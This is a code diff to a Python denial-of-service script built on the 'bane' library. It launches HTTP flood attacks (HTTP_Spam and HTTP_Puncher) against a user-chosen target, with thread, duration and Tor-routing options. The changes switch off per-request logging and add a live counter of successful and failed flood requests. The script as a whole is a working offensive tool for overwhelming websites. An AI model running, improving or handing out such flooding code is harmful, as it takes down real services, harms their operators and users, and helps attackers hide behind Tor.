@@ -1,4 +1,4 @@
-import bane,sys,socket
+import bane,sys,socket,time
 
 if sys.version_info < (3, 0):
     input = raw_input
@@ -84,7 +84,7 @@ while True:
         print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
 
 if spam_mode==True:
-    http_flooder_instance = bane.HTTP_Spam(target,p=port,timeout=timeout,threads=threads, duration=duration, tor=tor, logs=True,method=method)
+    http_flooder_instance = bane.HTTP_Spam(target,p=port,timeout=timeout,threads=threads, duration=duration, tor=tor, logs=False,method=method)
 else:
     if port==443:
         target="https://"+target+'/'
@@ -112,12 +112,25 @@ else:
                     print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
                 except:
                     print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
-    http_flooder_instance = bane.HTTP_Puncher(target,timeout=timeout,threads=threads, duration=duration, tor=tor, logs=True,method=method,scrape_target=scrape_target,scraped_urls=scraped_urls)
+    http_flooder_instance = bane.HTTP_Puncher(target,timeout=timeout,threads=threads, duration=duration, tor=tor, logs=False,method=method,scrape_target=scrape_target,scraped_urls=scraped_urls)
 
 print(bane.Fore.RESET)
 
 while True:
     try:
+        time.sleep(1)
+        sys.stdout.write("\{}Total: {} {}| {}success => {} {}| {}Fails => {}{}".format(
+            bane.Fore.BLUE,
+            http_flooder_instance.counter+http_flooder_instance.fails,
+            bane.Fore.WHITE,
+            bane.Fore.GREEN,
+            http_flooder_instance.counter,
+            bane.Fore.WHITE,
+            bane.Fore.RED,
+            http_flooder_instance.fails,
+            bane.Fore.RESET
+            ))
+        sys.stdout.flush()
         if http_flooder_instance.done() == True:
             break
     except:
